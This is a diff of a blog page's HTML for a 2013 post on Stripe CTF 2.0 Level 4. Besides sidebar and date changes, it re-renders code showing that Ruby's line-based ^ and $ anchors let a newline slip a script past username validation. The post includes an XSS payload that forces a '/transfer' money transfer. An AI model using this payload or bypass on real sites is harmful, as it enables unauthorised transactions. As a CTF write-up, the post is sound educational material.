@@ -39,12 +39,10 @@
 <body>
   <aside>
     <div id="user_meta">
-      <a href="https://blog.jimjh.com">
-        <img src="https://blog.jimjh.com/images/jimjh.png" alt="logo">
-      </a>
-      <h2><a href="https://blog.jimjh.com">James Lim</a></h2>
-      <p></p>
+      <h2><a href="https://blog.jimjh.com">Ampersand</a></h2>
+      <p>Moved to Medium in 2019.</p>
       <ul>
+        <li><a href="https://medium.com/@jimjh" target="_blank">Medium</a></li>
         <li><a href="https://jimjh.com" target="_blank">Profile</a></li>
       </ul>
     </div>
@@ -62,6 +60,9 @@
   <div class="article_title">
     <h1><a href="https://blog.jimjh.com/playing-with-stripe-ctf.html">Playing with Stripe CTF</a></h1>
   </div>
+  <div class="article_meta">
+    <p>Posted on: Fri 21 June 2013</p>
+  </div>
   <div class="article_text">
     <p>I was playing around with Stripe's <a href="https://github.com/stripe-ctf/stripe-ctf-2.0">source code</a> for last year's CTF,
 and from what I could see online, most people solved Level 4 by using XSS in
@@ -75,18 +76,18 @@ the password field. But look at the following line in <code>srv.rb</code>:</p>
 <p>Turns out there is a hole here as well due to the way Ruby treats the <code>^</code> and
 <code>$</code> metacharacters. According to the <a href="http://www.ruby-doc.org/core-1.9.2/Regexp.html#label-Anchors">documentation</a>, the <code>^</code> anchor
 matches the beginning of a <em>line</em>, instead of the entire string. Thus</p>
-<div class="highlight"><pre><span></span><span class="nb">puts</span> <span class="s2">&quot;match&quot;</span> <span class="k">if</span> <span class="s2">&quot;&amp;lt;script&amp;gt;&quot;</span> <span class="o">=~</span> <span class="sr">/^\w$/</span>     <span class="c1"># doesn&#39;t print anything</span>
-<span class="nb">puts</span> <span class="s2">&quot;match&quot;</span> <span class="k">if</span> <span class="s2">&quot;&amp;lt;script&amp;gt;</span><span class="se">\n</span><span class="s2">x&quot;</span> <span class="o">=~</span> <span class="sr">/^\w$/</span>  <span class="c1">#&amp;gt;&amp;gt; match</span>
+<div class="highlight"><pre><span></span><span class="nb">puts</span> <span class="s2">&quot;match&quot;</span> <span class="k">if</span> <span class="s2">&quot;&lt;script&gt;&quot;</span> <span class="o">=~</span> <span class="sr">/^\w$/</span>     <span class="c1"># doesn&#39;t print anything</span>
+<span class="nb">puts</span> <span class="s2">&quot;match&quot;</span> <span class="k">if</span> <span class="s2">&quot;&lt;script&gt;</span><span class="se">\n</span><span class="s2">x&quot;</span> <span class="o">=~</span> <span class="sr">/^\w$/</span>  <span class="c1">#&gt;&gt; match</span>
 </pre></div>
 
 
 <p>This allows us to use the <code>username</code> field as an attack vector.</p>
-<div class="highlight"><pre><span></span><span class="n">xss</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">-</span><span class="n">eos</span>
-<span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">script</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>
-<span class="vg">$.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;/transfer&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="ss">to</span><span class="p">:</span> <span class="s1">&#39;me&#39;</span><span class="p">,</span> <span class="ss">amount</span><span class="p">:</span> <span class="s1">&#39;10&#39;</span> <span class="p">});</span>
-<span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">/</span><span class="n">script</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>
-<span class="n">x</span>
-<span class="n">eos</span>
+<div class="highlight"><pre><span></span><span class="n">xss</span> <span class="o">=</span> <span class="o">&lt;&lt;-</span><span class="dl">eos</span>
+<span class="sh">&lt;script&gt;</span>
+<span class="sh">$.post(&#39;/transfer&#39;, { to: &#39;me&#39;, amount: &#39;10&#39; });</span>
+<span class="sh">&lt;/script&gt;</span>
+<span class="sh">x</span>
+<span class="dl">eos</span>
 <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">.</span><span class="n">post_form</span> <span class="n">uri</span><span class="p">,</span> <span class="p">{</span> <span class="ss">username</span><span class="p">:</span> <span class="n">xss</span><span class="p">,</span> <span class="ss">password</span><span class="p">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">}</span>
 </pre></div>
 
@@ -100,7 +101,6 @@ line in ruby.</p>
 </ul>
   </div>
   <div class="article_meta">
-    <p>Posted on: Fri 21 June 2013</p>
     <p>Category: <a href="https://blog.jimjh.com/category/software.html">Software</a>
  &ndash; Tags:
       <a href="https://blog.jimjh.com/tag/ruby.html">ruby</a>,      <a href="https://blog.jimjh.com/tag/security.html">security</a>    </p>
